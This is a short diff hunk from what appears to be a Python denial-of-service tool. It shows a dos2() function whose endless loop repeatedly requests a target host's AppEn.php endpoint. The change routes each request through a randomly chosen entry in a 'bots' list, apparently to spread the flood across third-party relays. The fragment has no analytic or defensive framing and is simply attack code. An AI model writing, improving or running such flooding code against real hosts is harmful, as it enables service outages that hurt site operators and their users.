@@ -70,7 +70,7 @@ def dos():
 def dos2():
 	while True:
 		item=w.get()
-		bot_hammering("http://"+host+"/AppEn.php?appid=20181215&md5=060d7b8fc04d17dc7e5fa11928947bdc")
+		bot_hammering(random.choice(bots)+"http://"+host+"/AppEn.php?appid=20181215&md5=060d7b8fc04d17dc7e5fa11928947bdc")
 		w.task_done()
 
 
